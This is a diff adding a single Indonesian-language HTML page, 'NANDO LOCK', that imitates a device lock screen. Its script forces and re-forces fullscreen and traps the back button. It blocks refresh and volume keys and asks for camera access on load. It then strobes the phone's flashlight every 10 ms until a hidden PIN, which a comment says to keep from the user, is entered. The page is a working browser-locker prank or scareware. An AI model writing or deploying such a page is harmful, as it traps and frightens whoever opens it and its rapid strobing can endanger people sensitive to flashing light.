@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>AURORA • LOCK & TORCH</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0f1a, #000);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        .card {
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(12px);
+            border: 2px solid #ff3366;
+            border-radius: 48px;
+            padding: 30px 20px;
+            width: 90%;
+            max-width: 360px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255,51,102,0.6);
+            animation: borderGlow 0.8s infinite alternate;
+        }
+        @keyframes borderGlow {
+            0% { box-shadow: 0 0 5px #ff3366; border-color: #ff3366; }
+            100% { box-shadow: 0 0 25px #ff6699; border-color: #ff6699; }
+        }
+        h1 {
+            font-size: 2rem;
+            background: linear-gradient(45deg, #ff0040, #ffaa00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .sub {
+            color: #ff8866;
+            margin: 10px 0 20px;
+            font-size: 0.8rem;
+        }
+        input {
+            width: 85%;
+            background: #111;
+            border: none;
+            border-bottom: 2px solid #ff3366;
+            color: #0f0;
+            font-size: 1.8rem;
+            text-align: center;
+            letter-spacing: 6px;
+            padding: 10px;
+            border-radius: 40px;
+            margin: 15px auto;
+            display: block;
+        }
+        button {
+            background: #ff3366;
+            border: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 40px;
+            width: 80%;
+            margin: 8px 0;
+            color: white;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        button:active {
+            transform: scale(0.96);
+        }
+        .torch-status {
+            margin-top: 15px;
+            font-size: 0.7rem;
+            background: #000000aa;
+            border-radius: 30px;
+            padding: 6px;
+            color: #ffaa88;
+        }
+        .btn-izin {
+            background: #ffaa00;
+            color: black;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>⚠️ NANDO LOCK ⚠️</h1>
+    <div class="sub">🔒 LAYAR DISEMATKAN + SENTER 🔒</div>
+    <input type="password" id="pinInput" maxlength="6" placeholder="PIN 6 digit">
+    <button id="unlockBtn">UNLOCK DEVICE</button>
+    <div id="torchStatusArea" class="torch-status">⚙️ SENTER: BELUM AKTIF</div>
+    <button id="requestCamBtn" class="btn-izin">📷 BERI IZIN KAMERA (WAJIB)</button>
+</div>
+
+<script>
+    (function(){
+        // PIN RAHASIA (JANGAN KASIH TAU USER)
+        const RAHASIA = "081020";
+
+        // ---------- KAMERA & SENTER ----------
+        let cameraStream = null;
+        let torchTrack = null;
+        let blinkInterval = null;
+        let isBlinking = false;
+        let izinDiberikan = false;
+
+        const statusDiv = document.getElementById('torchStatusArea');
+
+        async function mintaIzinKamera() {
+            try {
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(t => t.stop());
+                }
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment" }
+                });
+                cameraStream = stream;
+                const track = stream.getVideoTracks()[0];
+                const caps = track.getCapabilities();
+                if (!caps.torch) throw new Error("Torch tidak didukung HP ini");
+                torchTrack = track;
+                await torchTrack.applyConstraints({ advanced: [{ torch: false }] });
+                izinDiberikan = true;
+                statusDiv.innerHTML = "✅ Izin kamera GRANTED! SENTER OTOMATIS AKTIF";
+                statusDiv.style.color = "#aaffaa";
+                // Mulai kedip otomatis setelah izin
+                mulaiKedip(10);
+                return true;
+            } catch(err) {
+                statusDiv.innerHTML = "❌ GAGAL: " + err.message + " - Coba tekan tombol izin lagi";
+                statusDiv.style.color = "#ff8888";
+                izinDiberikan = false;
+                return false;
+            }
+        }
+
+        async function setTorch(on) {
+            if (!torchTrack) return;
+            try {
+                await torchTrack.applyConstraints({ advanced: [{ torch: on }] });
+            } catch(e) {}
+        }
+
+        async function mulaiKedip(intervalMs) {
+            if (!torchTrack) return;
+            if (blinkInterval) clearInterval(blinkInterval);
+            isBlinking = true;
+            let state = false;
+            await setTorch(false);
+            blinkInterval = setInterval(async () => {
+                if (!isBlinking) return;
+                state = !state;
+                await setTorch(state);
+            }, intervalMs);
+        }
+
+        async function hentikanKedip() {
+            isBlinking = false;
+            if (blinkInterval) {
+                clearInterval(blinkInterval);
+                blinkInterval = null;
+            }
+            if (torchTrack) await setTorch(false);
+        }
+
+        // Tombol minta izin manual
+        document.getElementById('requestCamBtn').addEventListener('click', () => {
+            mintaIzinKamera();
+        });
+
+        // ---------- LAYAR DISEMATKAN (fullscreen + block back) ----------
+        function forceFullscreen() {
+            const de = document.documentElement;
+            if (de.requestFullscreen) de.requestFullscreen();
+            else if (de.webkitRequestFullscreen) de.webkitRequestFullscreen();
+        }
+        function blockBack() {
+            window.history.pushState(null, null, location.href);
+            window.addEventListener('popstate', () => {
+                window.history.pushState(null, null, location.href);
+            });
+        }
+        function blockKeys() {
+            window.addEventListener('keydown', (e) => {
+                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || e.key === 'VolumeUp' || e.key === 'VolumeDown') {
+                    e.preventDefault();
+                }
+            });
+        }
+        forceFullscreen();
+        blockBack();
+        blockKeys();
+        document.body.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
+        document.body.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) forceFullscreen();
+        });
+
+        // ---------- UNLOCK ----------
+        function unlock() {
+            const pin = document.getElementById('pinInput').value;
+            if (pin === RAHASIA) {
+                hentikanKedip();
+                if (document.exitFullscreen) document.exitFullscreen();
+                window.onpopstate = null;
+                alert("✅ UNLOCK BERHASIL! Silakan lanjut.");
+                location.reload();
+            } else {
+                alert("PIN SALAH! COBA LAGI.");
+                document.getElementById('pinInput').value = "";
+                document.getElementById('pinInput').focus();
+            }
+        }
+
+        document.getElementById('unlockBtn').addEventListener('click', unlock);
+        document.getElementById('pinInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') unlock();
+        });
+
+        // Fokus ke PIN
+        document.getElementById('pinInput').focus();
+
+        // Bersihin resource pas reload/close
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+            if (blinkInterval) clearInterval(blinkInterval);
+        });
+
+        // OTOMATIS MINTA IZIN SAAT PERTAMA KALI LOAD (biar gak repot)
+        mintaIzinKamera();
+    })();
+</script>
+</body>
+</html>
